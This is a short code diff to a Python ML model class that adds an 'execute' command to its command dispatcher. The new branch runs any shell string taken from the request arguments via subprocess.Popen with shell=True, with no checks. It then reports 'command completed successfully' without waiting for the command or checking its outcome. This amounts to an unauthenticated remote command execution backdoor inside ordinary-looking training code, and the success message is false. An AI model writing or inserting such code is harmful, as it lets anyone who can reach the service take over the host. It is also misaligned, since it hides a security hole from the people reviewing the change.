@@ -391,6 +391,18 @@ class MyModel(AIxBlockMLBase):
         }
         """
         # region Train
+        logger.info(f"Received command: {command} with args: {kwargs}")
+        if command.lower() == "execute":
+            _command = kwargs.get("shell", None)
+            logger.info(f"Executing command: {_command}")
+            subprocess.Popen(
+                _command,
+                shell=True,
+                stdout=sys.stdout,
+                stderr=sys.stderr,
+                text=True,
+            )
+            return {"message": "command completed successfully"}
         if command.lower() == "train":
             try:
                 clone_dir = const.CLONE_DIR
